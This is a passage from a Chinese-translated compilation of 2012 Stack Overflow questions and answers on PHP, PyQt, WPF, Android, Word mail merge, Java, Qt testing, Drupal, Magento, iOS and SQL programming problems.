**注意：**代码已经使用 MySQLi，我不想切换到 PDO（现在切换超出了本项目的范围）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T17:55:17.673

因为参数是**通过*引用传递的，所以可以在调用之前******或***之后将值赋给变量`bind_param`。无论哪种方式都会奏效。

如果变量是按值传递的*，*则每次更改它们的值时都需要绑定它们。但是由于它们是通过引用传递的，因此您只需要绑定它们一次。

在单次执行的情况下，操作顺序并不重要，可能取决于值的来源。**在循环的情况下，您绝对应该`bind_param`在循环之前调用。**

# php - 多个 SOAP 请求未同时处理

> ID：13845117
> 
> 赞同：0
> 
> 时间：2012-12-12T17:17:30.183
> 
> 标签：php, apache, soap, call

我有一个 SOAP 服务器，它能够一次接受多个 SOAP 请求，并且可以同时处理它们。

如果我创建一个基本的 SOAP 客户端 PHP 脚本来发出请求，并在不同的机器上同时运行该脚本多次，则请求似乎在服务器上排队，并且仅被一一处理，而不是同时处理。

Apache/PHP/SOAP 中是否有任何可能导致这种行为的东西？

我很欣赏这可能有点晦涩难懂，所以我主要想知道是否有人以前遇到过这个问题以及解决方案是什么。我难住了。

SOAP 调用如下所示：

```
$client = new SoapClient($config['parsingWSDL'],array('trace' => FALSE, 'exceptions' => TRUE));
$return = $client->__soapCall("ProcessCV",array($args)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:23:57.510

没有理由`SoapClient`让单独的实例（每个请求都是一个新的......）相互等待。但是，在客户端，如果 HTTP`KeepAlive`想要回收相同的连接，它可能会出现问题，并且在服务器端使用具有相同标识符的会话也会阻塞，直到释放锁（因此，在这种情况下，关闭会话尽快`session_write_close()`而不是保持打开状态。

其余的取决于您的 SoapServer 实际执行的操作，SQL 查询可能正在等待锁定，或者您`ProcessCV`可能完成的任何其他锁定可能是原因。

# python - Python：如何区分长、短按钮按下和单击

> ID：13845121
> 
> 赞同：3
> 
> 时间：2012-12-12T17:17:43.430
> 
> 标签：python, pyqt

我想要一个带有 4 个按钮的简单 GUI。如果您只是单击按钮，则应执行功能A，短按按钮（例如1sec）应执行功能B，最后应执行长按（例如> 2s）功能C。想象一个柜台。如果单击按钮，它将被重置为 0 如果您短按按钮，计数器将增加 1，例如 t=1sec 如果您长按按钮，计数器将增加 10，直到释放按钮。

有人有想法吗。我试图用第二个线程来完成它，但我还没有找到像你可以启动它那样停止线程的可能性

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-13T01:27:28.550

如果您使用继承 QAbstractButton 的小部件，这在 PyQt 中很容易做到。不需要任何计时器或单独的线程。只需使用内置的[自动重复](https://qt-project.org/doc/qt-4.8/qabstractbutton.html#autoRepeat-prop)功能，并记录当前状态。

这是一个简单的演示：

```
from PyQt4 import QtGui, QtCore

class Button(QtGui.QPushButton):
    def __init__(self, *args, **kwargs):
        QtGui.QPushButton.__init__(self, *args, **kwargs)
        self.setAutoRepeat(True)
        self.setAutoRepeatDelay(1000)
        self.setAutoRepeatInterval(1000)
        self.clicked.connect(self.handleClicked)
        self._state = 0

    def handleClicked(self):
        if self.isDown():
            if self._state == 0:
                self._state = 1
                self.setAutoRepeatInterval(50)
                print 'press'
            else:
                print 'repeat'
        elif self._state == 1:
            self._state = 0
            self.setAutoRepeatInterval(1000)
            print 'release'
        else:
            print 'click'

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    button = Button('Test Button')
    button.show()
    sys.exit(app.exec_()) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:24:07.570

在 wxPython 中我会这样做……但是您可能需要为您的 GUI 库调整它……

```
start_time = None
def onLeftDown(e):
    global running 
    running = True
    ct =0 
    while running:
        ct += 1
        do_something(ct)

def onLeftUp(e):
    print "You Pressed For %s Seconds!"%(time.time()-start_time)

my_btn = wx.Button(parent,-1,"Click Me!")
my_btn.Bind(wx.EVT_LEFT_DOWN,onLeftDown)
my_btn.Bind(wx.EVT_LEFT_UP,onLeftUp) 
```

我对 QT 不是很熟悉，但也许你可以修改这个 wx 代码来做你想做的事......

```
import wx
ct = 0
def counting():
    global running
    global ct
    if running:
        ct +=1
        print ct
        wx.CallLater(1,counting)
    else:
        print "OK DONE COUNTING AT:",ct
def onLeftDown(evt):
    global running
    running = True
    counting()

def onLeftUp(evt):
    print "STOP NOW!!"
    global running 
    running = False

a = wx.App(redirect=False)
f = wx.Frame(None,-1,"asdasd")

b = wx.Button(f,-1,"Click Me")

b.Bind(wx.EVT_LEFT_DOWN,onLeftDown)
b.Bind(wx.EVT_LEFT_UP,onLeftUp)

f.Show()
a.MainLoop() 
```

# wpf - WPF：格式化标签

> ID：13845124
> 
> 赞同：12
> 
> 时间：2012-12-12T17:17:54.880
> 
> 标签：wpf, fonts, resourcedictionary

我有以下扩展器代码：

```
 <Expander Name="CompanyLinks" Header="{StaticResource companyLinksHeader}"
              FontSize="18" FontFamily="Calibri" FontWeight="Bold">
        <StackPanel>
            <Label Content="{StaticResource companyLinksItemSummary}" 
                   FontSize="14" FontFamily="Calibri" FontWeight="Bold"/>
            <Label Content="{StaticResource companyLinksItemInfo}" 
                   FontSize="14" FontFamily="Calibri" FontWeight="Bold"/>
            <Label Content="{StaticResource companyLinksItemIssues}" 
                   FontSize="14" FontFamily="Calibri" FontWeight="Bold"/>
            <Label Content="{StaticResource companyLinksItemMessages}" 
                   FontSize="14" FontFamily="Calibri" FontWeight="Bold"/>
        </StackPanel>   
    </Expander> 
```

StaticResources 定义如下（在我的资源字典中）：

```
<sys:String x:Key="companyLinksHeader">company</sys:String>
<sys:String x:Key="companyLinksItemSummary">summary</sys:String>
<sys:String x:Key="companyLinksItemInfo">info</sys:String>
<sys:String x:Key="companyLinksItemIssues">issues</sys:String>
<sys:String x:Key="companyLinksItemMessages">messages</sys:String> 
```

有没有办法定义一个字典条目（或其他东西）来处理标题和标签的字体样式，这样我就不必一遍又一遍地定义相同的字体（并且只在一个地方更改它应该我应该想改变字体）？

**编辑**

我找到了一个解决方案（感谢那些发布的人），并为 StackPanel 标签项使用以下样式：

```
<!-- Expander Items text style -->
<Style x:Key="expanderItemsTextStyle">
    <Setter Property="Label.FontFamily" Value="Trebuchet MS"></Setter>
    <Setter Property="Label.FontWeight" Value="Normal"></Setter>
    <Setter Property="Label.FontSize" Value="14"></Setter>
    <Setter Property="Label.Foreground" Value="Aqua"></Setter>
</Style> 
```

并像这样实现它（将其应用到 StackPanel 以影响所有标签）：

```
<Expander Name="CompanyLinks" Header="{StaticResource companyLinksHeader}"
          Style="{StaticResource expanderHeaderTextStyle}">
    <StackPanel Style="{StaticResource expanderItemsTextStyle}">
        <Label Content="{StaticResource companyLinksItemSummary}"/>
        <Label Content="{StaticResource companyLinksItemInfo}" />
        <Label Content="{StaticResource companyLinksItemIssues}" />
        <Label Content="{StaticResource companyLinksItemMessages}" />
    </StackPanel>   
</Expander> 
```

一件不起作用的事情是Label.Foreground。前景色保持黑色，但我可以通过样式更改字体、大小或粗细。如果我将样式移动到标签定义中，尽管颜色有效。这是一个错误还是有一个不同的属性可以设置 StackPanel 标签的字体颜色（前景）。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-12T17:31:57.053

您可以使用`Style`within ，并在该部分中使用[BasedOn](http://msdn.microsoft.com/en-us/library/system.windows.style.basedon.aspx "基于")`Window.Resources`来引用此样式。这会将样式应用于其中的所有标签。 `StackPanel.Resources``StackPanel`

```
<Window>
    <Window.Resources>
        <Style x:Key="myLabelStyle" TargetType="{x:Type Label}">
            <Setter Property="FontSize" Value="14" />
            <Setter Property="FontFamily" Value="Calibri" />
            <Setter Property="FontWeight" Value="Bold" />
         </Style>
    </Window.Resources>
    <Expander Name="CompanyLinks" Header="{StaticResource companyLinksHeader}"
              FontSize="18" FontFamily="Calibri" FontWeight="Bold">
        <StackPanel>
            <StackPanel.Resources>
                <Style BasedOn="{StaticResource myLabelStyle}" TargetType="{x:Type Label}" />
            </StackPanel.Resources>
            <Label Content="{StaticResource companyLinksItemSummary}" />
            <Label Content="{StaticResource companyLinksItemInfo}" />
            <Label Content="{StaticResource companyLinksItemIssues}" />
            <Label Content="{StaticResource companyLinksItemMessages}" />
        </StackPanel>
    </Expander>
</Window> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-12T17:28:59.397

使用样式：

```
<Expander Name="CompanyLinks" Header="{StaticResource companyLinksHeader}"
          FontSize="18" FontFamily="Calibri" FontWeight="Bold">
    <Expander.Resources>
        <Style TargetType="Label">
            <Setter Property="FontSize" Value="14" />
            <Setter Property="FontFamily" Value="Calibri" />
            <Setter Property="FontWeight" Value="Bold" />
        </Style>
    </Expander.Resources>
    <StackPanel>
        <Label Content="{StaticResource companyLinksItemSummary}" />
        <Label Content="{StaticResource companyLinksItemInfo}" />
        <Label Content="{StaticResource companyLinksItemIssues}" />
        <Label Content="{StaticResource companyLinksItemMessages}" />
    </StackPanel>
</Expander> 
```

这里的`Style`目标都`Label`在`Expander`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:28:09.427

在资源文件中声明字体大小和字体名称

```
<FontFamily x:Key="BaseFontFamily">Calibri</FontFamily>
<sys:Double x:Key="BaseFontSize">12</sys:Double>

<Label Content="{StaticResource companyLinksItemMessages}" 
      FontSize="{StaticResource BaseFontSize}" FontFamily="{StaticResource fntfam}"/> 
```

# android - 如何让我的 android 应用程序只能安装在屏幕大于 480x800px 的设备上？

> ID：13845127
> 
> 赞同：1
> 
> 时间：2012-12-12T17:18:00.620
> 
> 标签：android, screen

我的 android 应用程序无法在小屏幕上正常运行。当我设计活动时，我假设它只在大于（或等于）`480px`x的屏幕上运行`800px`。（是的，我`px`没有使用过`dp`）。

有没有办法将应用程序配置为具有此限制？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T17:21:20.353

```
 <supports-screens android:smallScreens="false"
                      android:normalScreens="false"
                      android:largeScreens="true"
                      android:xlargeScreens="true"
                      android:requiresSmallestWidthDp="480" 

/> 
```

把它放在你的清单中

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:42:21.280

> 有没有办法将应用程序配置为具有此限制？

并不真地。heLL0 的答案很可能会产生这种净效应。但是，它实际上是在说“仅允许在对角线为 5 英寸或更大、最小尺寸为 480dp 的设备上使用此功能”。

这将消除一些大于 480x800 的设备，特别是最小尺寸在 480px 和 480dp 之间的设备。您可以通过消除`android:requiresSmallestWidthDp`来自 heLL0 的答案来解决此问题。

它还允许小于 480x800 的设备，如果它们碰巧有一个大于 5 英寸的屏幕尺寸。我不知道有任何这样的设备存在，但你永远不知道将来会发生什么。

# ms-word - 如何比较两个 MERGEFIELD 值？

> ID：13845131
> 
> 赞同：0
> 
> 时间：2012-12-12T17:18:25.500
> 
> 标签：ms-word

目前我有这个：

   { IF { MERGEFIELD M1} > {MERGEFIELD M2} “谢谢！” “没有” }

但它不起作用。它只会像这样工作：`{ MERGEFIELD M1} > 3`

**是否可以比较两个 MERGEFIELD 值？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-04T14:25:17.660

在“IF 字段示例” [http://office.microsoft.com/en-us/word-help/examples-of-if-fields-HP005187676.aspx](http://office.microsoft.com/en-us/word-help/examples-of-if-fields-HP005187676.aspx)中给出了一个示例，该示例完全涵盖了您想要的内容：

> 以下是一些通过将 IF 域代码与其他域代码一起使用来修改 IF 域代码的方法示例： - 将一个数据域与另一个数据域或书签进行比较 此 IF 域将“费率”数据域中的数字与“折扣”中的数字进行比较数据字段。如果数字相等，则打印指定的文本。
> 
> { IF { MERGEFIELD Rate } = { MERGEFIELD Discount } "我们将为您提供更大的折扣。" " " }
> 
> （如果费率数据字段中的数字不等于折扣字段中的数字，则不会打印任何文本。）

我还没有测试过，但是您比较的两个字段的内容之间是否存在细微差别？您从哪种类型的来源中提取数据？如果数据未正确修剪，我不太确定 Word 是否将值视为值；想想值的开头或结尾处的空白字符 - 你看着它，但你看不到它。为什么不将数据输出到带有“[{MERGEFIELD A1}] [{MERGEFIELD A2}]”的测试文档中，以便您检查修剪？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T10:38:22.457

您必须锁定您的 MERGEFIELD，以便在重新计算 IF 字段时不会重新计算它们。MS Word 会在重新计算 IF 字段时自动重新计算 MERGEFIELD 为 «M1» 和 «M2»，因此，IF 字段自然不会有正确的结果。要锁定字段，请选择它并按 CTRL + F11。要解锁它，请选择它并按 CTRL + SHIFT + F11。有关详细信息，请参阅[控制 MS Word 字段的更新方式](http://office.microsoft.com/en-us/word-help/insert-and-format-field-codes-in-word-2007-HA010338798.aspx#BM5)。

我相信 MS Word 的邮件合并不会在锁定的合并字段上工作。作为替代方案，您可以以编程[方式从 .NET 进行邮件合并，](http://www.gemboxsoftware.com/document/articles/c-sharp-vb-net-mail-merge)并使其在其他嵌套字段（如您的示例中的 IF）和锁定字段中工作。

# vba - 更改文本文件中多行的位置

> ID：13845139
> 
> 赞同：0
> 
> 时间：2012-12-12T17:18:48.377
> 
> 标签：vba, csv, excel, text-files

我得到了这个包含 18000 多行和 7 列的 CSV 文件。当我将它从 Excel 保存到 .txt 并在记事本中打开时，它显示如下：

```
10012   CITY    10012   CITY    RIKSDAGEN   CITY lokal  10 
```

但我想改变它，所以可以说：第一个 CITY 从位置 6 开始（紧跟在 10012 中的 2 之后），第二个 10012 在固定位置（比如说 26）等等。

我想我需要用常规空格但有 18000+ 行来切换“制表符”空格。是的。我不知道这是否可以在 vba 中完成，或者我是否是一个程序？

编辑：我想要的职位是 6,26,31,51,81

```
10012CITY   10012CITY   RIKSDAGEN   CITY lokal  10
1    6      26   31     51          81 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T06:04:40.470

一种可能性是在 Excel 本身中准备数据：

`A2:H2`: 字符串位置 (1;6;26..)
`A3:H3`: 你的数据

`I3`:`=A3&REPT(" ";B$2-A$2-LEN(A3))`
公式可以向右和向下复制。

结果将是添加了空格的单元格，可以将其连接成一个单元格 ( `=I3&J3...&P3`)，在需要的位置有空格。连接单元格的内容可以直接复制粘贴到记事本中。

电子表格示例：[http ://www.bumpclub.ee/~jyri_r/Excel/Getting_fixed_length_csv_file.xls](http://www.bumpclub.ee/~jyri_r/Excel/Getting_fixed_length_csv_file.xls)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:44:04.270

不清楚的一件事是，您的字段是否都已知不超过特定长度。例如，第一个字段 (10012) 的长度是否总是 5 个字符或更少？假设是这样，最简单的方法是首先将文件保存为 CSV 文件。然后，您可以根据需要使用 awk 对其进行格式化。让我们调用保存的文件 foo.csv。然后，您将执行：

gawk '{printf "%Ms%Ps%Qs%Rs%Ts%Us%Vs%Ws\n", $1, $2, $3, $4, $5, $6, $7, $8}' foo.csv

在上述命令中，您需要用适当的数字替换 M、P、Q、R、T、U、V、W。由于（如果？）第一个字段已知不超过 5 个字符，您将 M 设置为 5。由于“CITY”有四个字符，并且您希望第二个“10012”从位置 20 开始，您需要“CITY”占据 15 个空格，并且在这个 15 个空格的字段中也是左对齐的。因此，您可以将 P 设置为 -15。“-15”中的“-”确保“CITY”从该字段的左侧开始。继续，直到您完成所有字段。

如果你把它写在一张画有列的纸上，可能更容易得到正确的字段编号。

**编辑**： awk '{printf "%-5s%-20s%-5s%-20s%-30s%s %s %s\n", $1, $2, $3, $4, $5, $6, $7, $8}' foo .csv

您尚未指定最后几个字段的位置，但上面应该为您提供足够的信息来解决这个问题。

# java - 此抽象类的等效接口

> ID：13845140
> 
> 赞同：2
> 
> 时间：2012-12-12T17:18:48.433
> 
> 标签：java, interface, abstract-class

我正在用 Java 编写一个简单的网络浏览器。我有一个类 WebBrowserPane，它扩展了 JEditorPane 并将其设置为更好地显示网页（禁用编辑，添加 HyperlinkListener 等）。然后，我有一个类 WebBrowserFrame，它扩展了 JFrame，并在顶部放置了一些按钮和地址栏，在下方放置了 WebBrowserPane。不过，我希望它能够接受任何扩展 JEditorPane 并具有相关方法的东西，而不是只能在下面放置一个 WebBrowserPane。

我写了一个抽象类 AbstractBrowser 来实现这个：

```
import javax.swing.JEditorPane;

public abstract class AbstractBrowser extends JEditorPane {
public void back(){}
public void forward(){}
public void refresh(){}
} 
```

WebBrowserPane 然后扩展 AbstractBrowser：

```
public class WebBrowserPane extends AbstractBrowser {
WebBrowserPane(){
    setEditable(false);

    //etc
}
public void back(){
    //blah
}
} 
```

WebBrowserFrame 然后将任何 AbstractBrowser 作为参数：

```
public class WebBrowserFrame extends JFrame{
WebBrowserFrame(AbstractBrowser a){
    add(a);
}
} 
```

显然，这并不能确保抽象类方法永远被覆盖，所以我意识到这不是一个很好的解决方案。有没有办法使用接口来实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:26:28.787

您可以让您的子类扩展 JEditorPane，然后创建一个与您现在拥有的抽象类相同的接口，并让您的子类也实现该接口。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:24:58.477

问题是接口不能扩展 JEditorPane。但是您可以在抽象类中声明抽象方法，编译器会强制任何子类覆盖它们：

```
import javax.swing.JEditorPane;

public abstract class AbstractBrowser extends JEditorPane {
    public abstract void back();
    public abstract void forward();
    public abstract void refresh();
} 
```

# html - 以 HTML 格式显示来自本地网络的图像

> ID：13845143
> 
> 赞同：2
> 
> 时间：2012-12-12T17:18:53.477
> 
> 标签：html, image

我想`<img />`在 HTML 中使用标签来显示位于我们本地网络（文件系统）上的图像。

我们有，好吧，让我们说很多，存储在我们的网络上的图像，所以它们不是由网络服务器提供的。

以下适用于 IE，但不适用于 Chrome 或 Firefox...

```
<img src="\\10.10.10.10\share1\files\images\robin.jpg" />
<img src="file://10.10.10.10/share1/files/images/robin.jpg" /> 
```

我知道这可能是一个安全问题，但我正在使用本地网络应用程序和本地网络，所以我需要能够解决这个问题，特别是对于 Chrome。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2021-12-10T16:39:34.523

运行以下命令以解决 Flutter Web 中“加载网络图像失败”的问题，因此，请使用以下命令运行/构建

运行调试

```
flutter run -d chrome --web-renderer html 
```

生产发布

```
flutter build web --web-renderer html --release 
```

我从[https://protocoderspoint.com/failed-to-load-network-image-flutter-web/得到这个](https://protocoderspoint.com/failed-to-load-network-image-flutter-web/)

另请阅读 Flutter 的此文档以进一步了解 [https://docs.flutter.dev/development/platform-integration/web-images](https://docs.flutter.dev/development/platform-integration/web-images) [https://api.flutter.dev/flutter/widgets/HtmlElementView-class.html](https://api.flutter.dev/flutter/widgets/HtmlElementView-class.html)

# qt - 使用 QTestLib 测试我的课程

> ID：13845144
> 
> 赞同：1
> 
> 时间：2012-12-12T17:18:54.410
> 
> 标签：qt, unit-testing, qttest

我需要在 Qt 中为我的学校项目做一些单元测试，虽然我已经阅读了 Qt 教程，但我无法弄清楚我应该如何编写这样的测试。我提到的教程中显示的所有测试都是指内置方法。我应该如何为自定义类编写单元测试说这是我拥有的最简单的类：

任务.h

```
#ifndef TASK_H
#define TASK_H

#include <QDateTime>
#include <QTime>

class Task
{
private:
    bool ifDone;
    QString name;
    QString description;
    QDateTime *startTime;
    QTime *start;
    QDateTime *endTime;
    QTime *end;
    bool neededReminder;
    QDateTime *reminderTime;

public:
    Task(QString _name, QString _description, QDate *dayClicked, 
         QTime *_startTime, QTime *_endTime, bool reminder);

    QString toString();
};

#endif // TASK_H    ` 
```

任务.cpp

```
#include "task.h"

Task::Task(QString _name, QString _description, QDate *dayClicked, 
    QTime *_startTime, QTime *_endTime, bool reminder)
{
    ifDone = 0;
    name = _name;
    description = _description;
    start = _startTime;
    end = _endTime;
    startTime = new QDateTime(*dayClicked, *start);
    endTime = new QDateTime(*dayClicked, *end);
    neededReminder = reminder;
}

QString Task::toString() {
    QString task;
    task.append(this->name);
    task.append(" ");
    task.append(this->start->toString("HH:mm"));
    task.append(" - ");
    task.append(this->end->toString("HH:mm"));
    return task;
} 
```

我试图将这个类#include 到测试类中，并将 .h 和 .cpp 文件添加到项目中，但我没有做任何事情。任何人都可以为上述类编写一些示例测试方法（用于 toString 方法和构造函数），以便我可以继续自己的其余部分。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T21:09:34.307

老实说，我认为这个问题应该结束，你应该开始阅读你提供的一些书。另外，我看不到这里有什么要测试的，也许是字符串的结果？但是，看看这是否对您有帮助：

UnitTests.pro

```
QT       += testlib
QT       -= gui
TARGET = tst_unitteststest
CONFIG   += console
CONFIG   -= app_bundle
TEMPLATE = app
SOURCES += tst_unitteststest.cpp task.cpp
DEFINES += SRCDIR=\\\"$$PWD/\\\"
HEADERS += task.h 
```

tst_unitteststest.cpp

```
#include <QString>
#include <QtTest>
#include "task.h"

class UnitTestsTest : public QObject
{
   Q_OBJECT

public:
   UnitTestsTest();

private Q_SLOTS:
   void initTestCase();
   void cleanupTestCase();
   void testCase1();
};

UnitTestsTest::UnitTestsTest()
{
}

void UnitTestsTest::initTestCase()
{
}

void UnitTestsTest::cleanupTestCase()
{
}

void UnitTestsTest::testCase1()
{
   QVERIFY2(true, "Failure");
   Task t("name", "desc", new QDate(1, 1, 2012), new QTime(0, 0), new QTime(1, 0), false);
   QVERIFY(t.toString() == "name 00:00 - 01:00");
}
QTEST_APPLESS_MAIN(UnitTestsTest)
#include "tst_unitteststest.moc" 
```

考虑到这里有内存泄漏......但我不知道你希望你的班级变成什么样。测试当然会在这里通过。

# drupal - 当用户在drupal中更改密码时记录在日志中

> ID：13845147
> 
> 赞同：1
> 
> 时间：2012-12-12T17:19:00.873
> 
> 标签：drupal, drupal-7, watchdog

我需要记录用户何时在 drupal 7 中更改密码。当注册用户更改密码时，平台应将记录存储在数据库中。

我很感激任何指导。

谢谢 ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:23:15.160

创建一个[hook_form_user_profile_form_alter()](http://api.drupal.org/api/drupal/modules!system!system.api.php/function/hook_form_FORM_ID_alter/7)并添加一个额外的[#submit](http://api.drupal.org/api/drupal/developer!topics!forms_api_reference.html/7#submit_property)处理程序（到表单），您可以在其中执行以下操作：

```
if (!empty($form_state['values']['pass']) && $form_state['values']['pass'] != $form_state['values']['current_pass']) {
  watchdog('user', 'The %name changed his password.', array('%name' => $account->name), WATCHDOG_NOTICE);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:50:52.813

前几天我需要做类似的事情并想出了这个解决方案[`hook_user_presave()`](http://api.drupal.org/api/drupal/modules!user!user.api.php/function/hook_user_presave/7)

```
function MYMODULE_user_presave(&$edit, $account, $category) {
  if (!empty($edit['pass']) && $account->pass != $edit['pass']) {
    watchdog('MYMODULE', t('Password changed for %name', array('%name' => $account->name)));
  }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-17T02:30:53.043

我有一个沙盒模块来执行此操作： [https](https://drupal.org/sandbox/dhalbert/1695174) ://drupal.org/sandbox/dhalbert/1695174 （“密码更改日志”）。

它使用 a`hook_user_update()`但在其他方面与接受的答案非常相似。

# magento - magento 阻止或阻止 __store 参数使用

> ID：13845149
> 
> 赞同：0
> 
> 时间：2012-12-12T17:19:12.600
> 
> 标签：magento

我们的 magento 网站每个店面使用一个域。我想防止用户使用查询参数 __store 切换到另一个店面。

我在 Mage::run 的 index.php 中手动设置存储代码，具体取决于工作正常的 HTTP_HOST。

有没有办法阻止 __store 参数工作？

到目前为止，我唯一的想法是过滤 apache 中的参数并重写请求......但我更愿意在 magento 中使用一种干净的方式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T02:08:32.280

看到这个参数是在[`Mage_Core_Model_App`[link]](https://github.com/benmarks/magento-mirror/blob/1.7.0.2/app/code/core/Mage/Core/Model/App.php#L524)中解析的，在你的网络服务器软件中操作请求就不会那么麻烦了。

此外，在 Apache 中，您应该能够使用 RewriteCond 设置`MAGE_RUN_CODE`环境变量，这意味着您可以恢复*index.php*文件。

这个限制的目标是什么？

# objective-c - UIWebview 没有开始加载

> ID：13845150
> 
> 赞同：0
> 
> 时间：2012-12-12T17:19:12.537
> 
> 标签：objective-c, ios, uiwebview

我正在为网站开发本机应用程序。该应用程序基本上是网站的包装器，它实现了推送通知等功能。单击推送通知时，将使用以下代码转到相应的页面：

```
- (NSString *)handlePush:(NSDictionary *)notification
{
    if ([[notification objectForKey:@"aps"] objectForKey:@"badge"]) {
        int badgeNum = [[[notification objectForKey:@"aps"] objectForKey:@"badge"] integerValue];
        NSLog(@"Badge: %i, got from %@", badgeNum, [[notification objectForKey:@"aps"] objectForKey:@"badge"]);
        [UIApplication sharedApplication].applicationIconBadgeNumber = badgeNum;
    }
    if (!active) {
        NSLog(@"Got noti while not active, going to that chat!");
        NSString *hash;
        if ((hash = [notification objectForKey:@"h"])) {
            NSLog(@"Hash: %@", [hash stringByReplacingPercentEscapesUsingEncoding:NSUTF8StringEncoding]);
            return [NSString stringWithFormat:@"#%@", hash];
        }
        return @"";
    }
    return nil;
} 
```

Active 在应用程序进入后台和恢复后更改，以确保在用户使用应用程序时推送通知到达时不会触发它。该 URL 已正确解析，因为如果我在浏览器中手动粘贴完全相同的 URL，我会转到正确的页面。

我100％确定委托已设置，因为该`UIWebView: ShouldStartLoadWithRequest`方法被调用：

```
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType {
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSString *url = [[request URL] absoluteString];

    NSLog(@"shouldStartLoadWithRequest called with url %@", url);

    if ([url hasPrefix:BASE_URL]) {
        NSLog(@"Yea, i'll load this one for ya");
        // remove any get-params / hash suffix
        NSRange r = [url rangeOfString:@"?"];
        if (r.location == NSNotFound)
            r = [url rangeOfString:@"#"];

        if (r.location != NSNotFound)
            url = [url substringToIndex:r.location];

        if (![url isEqualToString:[defaults valueForKey:@"baseUrl"]]) {
            NSLog(@"setting new baseUrl %@", url);

            [defaults setValue:url forKey:@"baseUrl"];
            [defaults synchronize];
        }

        NSLog(@"Should go and load it now...");
        return YES;
    } 
} 
```

那里有一些缓存网页版本的逻辑。我通过断点逐步完成，它到达了该`return YES`部分，并调用了那里的日志。然而，在同一个委托中，`didStartLoad`并`didFailLoadWithError`没有被调用，它包含纯粹的 NSLogs。

在最初的应用程序启动时，这确实有效，并且它也有一次我使用断点单步执行了很长时间，所以这似乎是一些时间问题。希望不必使用任何像计时器这样的hacky解决方案，我希望这里的任何人都有类似问题的经验，或者有任何其他有价值的输入。

# php - 计算“乌鸦飞”的距离php

> ID：13845152
> 
> 赞同：6
> 
> 时间：2012-12-12T17:19:19.293
> 
> 标签：php, google-maps

我目前正在计算我的一个 wordpress 网站上的一个函数内两点之间的行驶距离。我通过调用使用谷歌距离矩阵来完成此操作

```
wp_remote_get(
    "http://maps.googleapis.com/maps/api/distancematrix/json?origins=".
    urlencode($origin).
    "&destinations=".
    urlencode($destination).
    "&sensor=false&units=imperial"
) 
```

然后将用户通过表单输入的起点和终点插入 url。是否可以使用类似的方法来计算“乌鸦飞翔”的距离，还是我必须重新设计我的功能？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T17:22:59.130

2点之间的距离：（lat1，lon1）到（lat2，lon2）

```
distance = acos(
     cos(lat1 * (PI()/180)) *
     cos(lon1 * (PI()/180)) *
     cos(lat2 * (PI()/180)) *
     cos(lon2 * (PI()/180))
     +
     cos(lat1 * (PI()/180)) *
     sin(lon1 * (PI()/180)) *
     cos(lat2 * (PI()/180)) *
     sin(lon2 * (PI()/180))
     +
     sin(lat1 * (PI()/180)) *
     sin(lat2 * (PI()/180))
    ) * 3959 
```

* * *

3959 是以英里为单位的地球半径。将此值替换为以 KM 为单位的半径（或任何其他单位），以获得相同单位的结果。

[**您可以通过与此工作示例**](http://en.wikipedia.org/wiki/Great-circle_distance#Worked_example)进行比较来验证您的实现：

# sql - 二叉树节点数

> ID：13845154
> 
> 赞同：-1
> 
> 时间：2012-12-12T17:19:22.380
> 
> 标签：sql, sql-server-2005

我想数 A (BC,F,G,G)。即`A`左侧有 5 个孩子`A`

```
 A                           B                           F

   b        D               F            G

 C             E 
```

我的表结构是：

```
MAIN         CHILD           SIDE              POSTION
A            NULL            NULL              0
A            B               LEFT              1
A            D               RIGHT             1
B            F               LEFT              1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:30:00.813

我不确定我是否有你的问题，但它是这样的吗？

```
select count(*) from (select child_id from my_table group by child_id) 
```

这将返回具有父节点（即任何节点的子节点）的节点数。

# java - 监听 WritableList 的变化

> ID：13845160
> 
> 赞同：1
> 
> 时间：2012-12-12T17:19:59.710
> 
> 标签：java, swt, listener

数据模型类

创建一个 IObservableList

1.  IObservableList observableList = new WritableList();
2.  Add 方法将数据添加到 observableList
3.  返回 observableList 的方法

表查看器类

1.  将内容提供者设置为 ObservableListContentProvider

图形界面类

1.  查看器 setInput 从数据模型类中获取 ObservableList

一切似乎都按预期工作，表格查看器随着 ObservableList 的更改而更新。

但我遇到的问题是如何更新 GUI 中的按钮。我有几个按钮可以根据数据模型中 ObservableList 中的对象计数启用和禁用。为了运行该逻辑，我必须知道列表何时发生变化。

我试图在 GUI 类中实现 IListChangeListener。然后添加方法

```
public void handleListChange(ListChangeEvent arg0) {
  updateButtons();  <-- My method to run the logic 
```

}

这不起作用，我应该实现其他东西而不是 IListChangeListener 吗？

我不确定应该在 GUI 类中实现什么来监听更改？

***编辑***

我是否必须向查看器添加侦听器？

```
viewer = new AplotDataTableViewer(parent, SWT.BORDER|SWT.V_SCROLL|SWT.FULL_SELECTION);
viewer.setInput(AplotDataModel.getInstance().getObservableList());
